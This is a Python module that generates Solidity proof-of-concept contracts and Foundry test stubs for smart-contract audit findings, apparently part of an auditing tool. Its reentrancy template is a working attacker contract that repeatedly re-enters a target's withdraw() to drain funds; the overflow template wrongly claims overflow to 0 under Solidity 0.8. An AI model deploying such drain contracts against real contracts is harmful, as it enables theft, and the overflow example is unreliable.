"""
Proof of Concept generator for vulnerabilities
"""

from pathlib import Path
from typing import Dict, Any, List, Optional
from string import Template


class POCGenerator:
    """Generate proof-of-concept exploits for found vulnerabilities"""
    
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def generate_poc(self, finding: Any) -> str:
        """Generate POC for a specific finding"""
        
        poc_templates = {
            "reentrancy": self._poc_reentrancy,
            "overflow": self._poc_overflow,
            "access_control": self._poc_access_control,
            "oracle": self._poc_oracle,
            "centralization": self._poc_centralization,
        }
        
        generator = poc_templates.get(finding.category, self._poc_generic)
        return generator(finding)
    
    def _poc_reentrancy(self, finding: Any) -> str:
        """Generate reentrancy POC"""
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TargetContract.sol";

contract ReentrancyPOC {{
    TargetContract public target;
    address public attacker;
    
    constructor(address _target) {{
        target = TargetContract(_target);
        attacker = msg.sender;
    }}
    
    // This function will be called during the reentrancy
    receive() external payable {{
        if (address(target).balance > 0) {{
            // Re-enter the vulnerable function
            target.withdraw();
        }}
    }}
    
    function attack() external {{
        // First call to trigger the vulnerability
        target.deposit{{value: 1 ether}}();
        target.withdraw();
    }}
    
    function getBalance() external view returns (uint256) {{
        return address(this).balance;
    }}
}}
"""
    
    def _poc_overflow(self, finding: Any) -> str:
        """Generate overflow POC"""
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract OverflowPOC {{
    // Test for integer overflow vulnerability
    // The vulnerability exists because Solidity <0.8.0 doesn't check for overflow
    
    function testOverflow() public pure returns (uint256) {{
        // This will overflow in Solidity <0.8.0
        uint256 max = type(uint256).max;
        uint256 result = max + 1; // Overflows to 0
        
        return result;
    }}
}}
"""
    
    def _poc_access_control(self, finding: Any) -> str:
        """Generate access control POC"""
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AccessControlPOC {{
    // This POC demonstrates missing access control
    // An attacker can call restricted functions
    
    function exploit(address target) external {{
        // Call function without proper access control
        // This should fail but doesn't due to missing checks
        
        // Example:
        // TargetContract(target).mint(attacker, 1000000);
        // TargetContract(target).withdraw(1000000);
    }}
}}
"""
    
    def _poc_oracle(self, finding: Any) -> str:
        """Generate oracle manipulation POC"""
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract OracleManipulationPOC {{
    // This POC demonstrates oracle price manipulation
    // The vulnerability exists when oracle data is not properly validated
    
    function testStalePrice() external view returns (bool) {{
        // Check if oracle price is stale
        // The target contract doesn't check updatedAt
        
        // Example attack:
        // 1. Wait for oracle to become stale
        // 2. Call function that uses stale price
        // 3. Profit from price discrepancy
        
        return true;
    }}
}}
"""
    
    def _poc_centralization(self, finding: Any) -> str:
        """Generate centralization risk POC"""
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CentralizationPOC {{
    // This POC demonstrates centralization risk
    // The owner can perform privileged operations
    
    function demonstrateRisk() external {{
        // Owner can:
        // - Mint unlimited tokens
        // - Pause contract
        // - Change critical parameters
        // - Rug pull funds
        
        // This is a design issue, not a code bug
        // But it's important to document
    }}
}}
"""
    
    def _poc_generic(self, finding: Any) -> str:
        """Generate generic POC"""
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// POC for: {finding.title}
// Category: {finding.category}
// Severity: {finding.severity}

contract GenericPOC {{
    // This is a generic POC template
    // Customize based on the specific vulnerability
    
    function testVulnerability() external {{
        // Add test logic here
    }}
}}
"""
    
    def generate_foundry_test(self, finding: Any, contract_name: str) -> str:
        """Generate Foundry test file"""
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/{contract_name}.sol";

contract {contract_name}Test is Test {{
    {contract_name} public target;
    
    function setUp() public {{
        target = new {contract_name}();
    }}
    
    function test_{finding.category}_{finding.id}() public {{
        // Test for: {finding.title}
        // Severity: {finding.severity}
        
        // Add test logic here
        // Example:
        // target.deposit{{value: 1 ether}}();
        // target.withdraw();
        
        // Assert expected behavior
    }}
    
    function testFuzz_{finding.category}(uint256 amount) public {{
        // Fuzz test for: {finding.title}
        
        // Add fuzz test logic here
    }}
}}
"""
    
    def save_poc(self, finding: Any, contract_name: str) -> Path:
        """Save POC to file"""
        poc_content = self.generate_poc(finding)
        
        filename = f"poc_{finding.category}_{finding.id}.sol"
        filepath = self.output_dir / filename
        
        with open(filepath, 'w') as f:
            f.write(poc_content)
        
        return filepath
    
    def save_foundry_test(self, finding: Any, contract_name: str) -> Path:
        """Save Foundry test to file"""
        test_content = self.generate_foundry_test(finding, contract_name)
        
        filename = f"test_{finding.category}_{finding.id}.t.sol"
        filepath = self.output_dir / filename
        
        with open(filepath, 'w') as f:
            f.write(test_content)
        
        return filepath
    
    def generate_all_pocs(self, findings: List[Any], contract_name: str) -> List[Path]:
        """Generate POCs for all findings"""
        poc_files = []
        
        for finding in findings:
            if finding.severity.value in ['critical', 'high', 'medium']:
                poc_file = self.save_poc(finding, contract_name)
                poc_files.append(poc_file)
                
                # Also generate Foundry test
                test_file = self.save_foundry_test(finding, contract_name)
                poc_files.append(test_file)
        
        return poc_files
